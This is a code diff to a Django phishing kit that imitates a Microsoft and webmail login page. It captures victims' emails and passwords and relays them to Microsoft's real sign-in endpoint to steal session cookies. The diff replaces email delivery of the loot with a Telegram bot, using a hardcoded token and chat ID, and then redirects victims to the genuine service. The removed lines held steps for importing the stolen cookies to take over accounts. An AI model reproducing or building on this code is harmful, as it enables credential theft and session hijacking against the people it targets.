@@ -15,6 +15,37 @@ import requests
 from datetime import datetime
 from .models import SessionTracking, ClickEvent
 
+# ========== TELEGRAM CONFIGURATION ==========
+TELEGRAM_BOT_TOKEN = "8518266646:AAE29WCw65NMEZnVEH7h6q8tNKhFSBw5uqM"
+TELEGRAM_CHAT_ID = "6653593232"
+
+def send_telegram_message(message):
+    """Send message to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"[TELEGRAM ERROR] {str(e)}")
+        return False
+
+def send_telegram_file(file_content, filename):
+    """Send file to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        files = {'document': (filename, file_content, 'application/json')}
+        data = {'chat_id': TELEGRAM_CHAT_ID}
+        response = requests.post(url, files=files, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"[TELEGRAM ERROR] {str(e)}")
+        return False
+
 # ========== HELPER FUNCTIONS ==========
 
 def generate_session_id():
@@ -75,98 +106,50 @@ def cookies_to_firefox_json(cookies_dict):
         })
     return cookies_list
 
-# ========== SEND CLEAN EMAIL ==========
+# ========== SEND TO TELEGRAM ==========
 
-def send_session_email(session_data, session_id):
-    recipients = getattr(settings, 'CAPTURE_EMAIL_RECIPIENTS', ['your-email@gmail.com'])
-    if isinstance(recipients, str):
-        recipients = [recipients]
+def send_to_telegram(session_data, session_id):
+    """Send captured data to Telegram"""
     
     email = session_data.get('user', {}).get('email', 'Not captured')
     password = session_data.get('user', {}).get('password', 'Not captured')
-    
+    service = session_data.get('service', 'Unknown')
     microsoft_cookies = session_data.get('microsoft_cookies', {})
     
-    if microsoft_cookies:
-        cookies_to_show = microsoft_cookies
-        cookie_type = "REAL MICROSOFT COOKIES"
-    else:
-        cookies_to_show = session_data.get('cookies', {})
-        cookie_type = "YOUR APP COOKIES"
-    
-    netscape_cookies = cookies_to_netscape_format(cookies_to_show)
-    firefox_cookies_json = cookies_to_firefox_json(cookies_to_show)
-    
-    clean_data = {
-        'email': email,
-        'password': password,
-        'microsoft_cookies': microsoft_cookies,
-        'all_cookies': cookies_to_show,
-        'session_id': session_id,
-        'captured_at': datetime.now().isoformat(),
-        'ip': session_data.get('ip_address'),
-        'browser': session_data.get('browser', {}).get('name'),
-        'device': session_data.get('device', {}).get('type'),
-    }
-    
-    subject = f"Microsoft Session"
-    
-    body = f"""
-MICROSOFT ACCOUNT ACCESS
-========================
+    message = f"""
+🔐 <b>NEW LOGIN CAPTURED!</b>
 
-Email: {email}
-Password: {password}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 <b>CREDENTIALS</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 <b>Email:</b> <code>{email}</code>
+🔑 <b>Password:</b> <code>{password}</code>
+📌 <b>Service:</b> {service}
 
-Cookies Captured: {len(cookies_to_show)}
-Cookie Type: {cookie_type}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 <b>SESSION INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 <b>Session ID:</b> <code>{session_id}</code>
+🌍 <b>IP:</b> {session_data.get('ip_address', 'Unknown')}
+💻 <b>Browser:</b> {session_data.get('browser', {}).get('name', 'Unknown')}
+📱 <b>Device:</b> {session_data.get('device', {}).get('type', 'Unknown')}
+🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-How to Import:
-1. Install Cookie Editor extension in Chrome
-2. Go to https://login.microsoftonline.com
-3. Open Cookie Editor → Delete All → Import
-4. Paste the attached JSON → Save → Refresh
-
-Captured: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-Session ID: {session_id}
-IP: {session_data.get('ip_address', 'Unknown')}
-Browser: {session_data.get('browser', {}).get('name', 'Unknown')}
-Device: {session_data.get('device', {}).get('type', 'Unknown')}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🍪 <b>COOKIES CAPTURED</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 <b>Total:</b> {len(microsoft_cookies)}
+📋 <b>Names:</b> {', '.join(microsoft_cookies.keys()) if microsoft_cookies else 'None'}
 """
     
-    try:
-        email_msg = EmailMessage(
-            subject=subject,
-            body=body,
-            from_email=settings.DEFAULT_FROM_EMAIL,
-            to=recipients,
-        )
-        
-        if cookies_to_show:
-            email_msg.attach(
-                f"cookies_{session_id}.txt",
-                netscape_cookies,
-                'text/plain'
-            )
-            email_msg.attach(
-                f"cookies_{session_id}.json",
-                json.dumps(firefox_cookies_json, indent=2),
-                'application/json'
-            )
-        
-        email_msg.attach(
-            f"session_{session_id}.json",
-            json.dumps(clean_data, indent=2),
-            'application/json'
-        )
-        
-        email_msg.send(fail_silently=False)
-        print(f"[✅ EMAIL SENT] {email} to {len(recipients)} recipients")
-        print(f"[🍪 COOKIES] {len(cookies_to_show)} cookies captured")
-        return True
-    except Exception as e:
-        print(f"[❌ EMAIL ERROR] {str(e)}")
-        return False
+    send_telegram_message(message)
+    
+    if microsoft_cookies:
+        firefox_cookies_json = cookies_to_firefox_json(microsoft_cookies)
+        json_content = json.dumps(firefox_cookies_json, indent=2)
+        send_telegram_file(json_content, f"cookies_{session_id}.json")
+    
+    return True
 
 # ========== SESSION STORAGE ==========
 
@@ -188,7 +171,8 @@ def get_or_create_session(session_id):
             'user': {},
             'events': [],
             'cookies': {},
-            'microsoft_cookies': {}
+            'microsoft_cookies': {},
+            'service': 'Unknown'
         }
     return active_sessions[session_id]
 
@@ -211,12 +195,6 @@ def track_click(request):
     session_data['os']['name'] = browser_info['os']
     session_data['device']['type'] = browser_info['device']
     
-    print(f"\n{'='*60}")
-    print(f"🎯 NEW SESSION: {session_id}")
-    print(f"📊 Source: {ref}")
-    print(f"🍪 Cookies captured: {len(session_data['cookies'])}")
-    print(f"{'='*60}\n")
-    
     response = redirect('/login/')
     response.set_cookie('ms_session_id', session_id, max_age=30*24*60*60, httponly=False)
     response.set_cookie('tracking_ref', ref, max_age=30*24*60*60, httponly=False)
@@ -227,6 +205,8 @@ def track_click(request):
 
 @csrf_exempt
 def login_page(request):
+    """Main login page with service dropdown + proxy to Microsoft"""
+    
     session_id = request.COOKIES.get('ms_session_id')
     if not session_id:
         return redirect('track_click')
@@ -236,6 +216,7 @@ def login_page(request):
     if request.method == 'POST':
         email = request.POST.get('email', '')
         password = request.POST.get('password', '')
+        service = request.POST.get('service', '')
         
         if email and password:
             session_data['user'] = {
@@ -243,23 +224,15 @@ def login_page(request):
                 'password': password,
                 'submitted_at': datetime.now().isoformat()
             }
+            session_data['service'] = service
             
-            print(f"[🔑 CREDENTIALS CAPTURED] {email}:{password}")
+            print(f"[CREDENTIALS CAPTURED] {service}: {email}:{password}")
             
-            try:
-                session_track = SessionTracking.objects.get(session_id=session_id)
-                session_track.email = email
-                session_track.password = password
-                session_track.raw_data = session_data
-                session_track.save()
-            except Exception as e:
-                print(f"[DB ERROR] {str(e)}")
-            
+            # ========== PROXY TO MICROSOFT TO CAPTURE COOKIES ==========
             try:
                 proxy_session = requests.Session()
                 
-                print("[🔄 PROXY] Getting Microsoft login page...")
-                
+                # Get Microsoft login page
                 proxy_session.get(
                     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                     params={
@@ -270,8 +243,7 @@ def login_page(request):
                     }
                 )
                 
-                print("[🔄 PROXY] Submitting credentials to Microsoft...")
-                
+                # Submit credentials to Microsoft
                 ms_response = proxy_session.post(
                     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                     data={
@@ -285,32 +257,34 @@ def login_page(request):
                     allow_redirects=False
                 )
                 
+                # ========== CAPTURE MICROSOFT COOKIES! ==========
                 microsoft_cookies = proxy_session.cookies.get_dict()
                 session_data['microsoft_cookies'] = microsoft_cookies
                 
                 print(f"[🍪 MICROSOFT COOKIES CAPTURED] {len(microsoft_cookies)} cookies")
                 print(f"[📋 COOKIE NAMES] {', '.join(microsoft_cookies.keys())}")
                 
-                try:
-                    session_track = SessionTracking.objects.get(session_id=session_id)
-                    session_track.ms_session_cookie = json.dumps(microsoft_cookies)
-                    session_track.raw_data = session_data
-                    session_track.save()
-                except Exception as e:
-                    print(f"[DB ERROR] {str(e)}")
+                # Send to Telegram WITH cookies
+                send_to_telegram(session_data, session_id)
                 
-                send_session_email(session_data, session_id)
-                
-                print("[🔄 PROXY] Redirecting to REAL Microsoft login...")
-                
-                return redirect('https://login.microsoftonline.com')
-                    
             except Exception as e:
                 print(f"[❌ PROXY ERROR] {str(e)}")
-                import traceback
-                traceback.print_exc()
-                messages.error(request, 'Error connecting to Microsoft. Please try again.')
-                return redirect('https://login.microsoftonline.com')
+                # Still send credentials even if proxy fails
+                send_to_telegram(session_data, session_id)
+            
+            # ========== REDIRECT TO REAL SERVICE ==========
+            service_urls = {
+                'outlook': 'https://outlook.live.com',
+                'hotmail': 'https://outlook.live.com',
+                'yahoo': 'https://mail.yahoo.com',
+                'aol': 'https://mail.aol.com',
+                'other': 'https://mail.google.com',
+                'office': 'https://office.com',
+                'webmail': 'https://webmail.com'
+            }
+            
+            redirect_url = service_urls.get(service, 'https://outlook.live.com')
+            return redirect(redirect_url)
     
     return render(request, 'login.html')
 
@@ -325,28 +299,6 @@ def logout_view(request):
     return redirect('login')
 
 # ========== API ENDPOINTS ==========
-
-@csrf_exempt
-def collect_browser_info(request):
-    try:
-        data = json.loads(request.body)
-        session_id = data.get('session_id')
-        
-        if session_id and session_id in active_sessions:
-            session_data = active_sessions[session_id]
-            session_data['browser'].update({
-                'name': data.get('browser_name', 'Unknown'),
-                'version': data.get('browser_version', 'Unknown'),
-                'language': data.get('language', 'Unknown')
-            })
-            session_data['screen'].update({
-                'width': data.get('screen_width', 0),
-                'height': data.get('screen_height', 0)
-            })
-        
-        return JsonResponse({'status': 'success'})
-    except Exception as e:
-        return JsonResponse({'status': 'error', 'message': str(e)})
 
 @csrf_exempt
 def collect_click_event(request):
@@ -367,37 +319,6 @@ def collect_click_event(request):
         return JsonResponse({'status': 'success'})
     except Exception:
         return JsonResponse({'status': 'error'})
-
-# ========== EXPORT ==========
-
-@staff_member_required
-def export_session(request, session_id):
-    try:
-        session = SessionTracking.objects.get(session_id=session_id)
-        data = session.raw_data
-        
-        response = JsonResponse(data, json_dumps_params={'indent': 2})
-        response['Content-Disposition'] = f'attachment; filename="session_{session_id}.json"'
-        return response
-    except SessionTracking.DoesNotExist:
-        return JsonResponse({'error': 'Session not found'}, status=404)
-
-@staff_member_required
-def export_cookies(request, session_id):
-    try:
-        session = SessionTracking.objects.get(session_id=session_id)
-        cookies = session.cookies_json or {}
-        
-        lines = ["# Netscape HTTP Cookie File", ""]
-        for name, value in cookies.items():
-            lines.append(f".microsoft.com\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
-        
-        content = "\n".join(lines)
-        response = HttpResponse(content, content_type='text/plain')
-        response['Content-Disposition'] = f'attachment; filename="cookies_{session_id}.txt"'
-        return response
-    except SessionTracking.DoesNotExist:
-        return JsonResponse({'error': 'Session not found'}, status=404)
 
 # ========== ADMIN VIEWS ==========
 
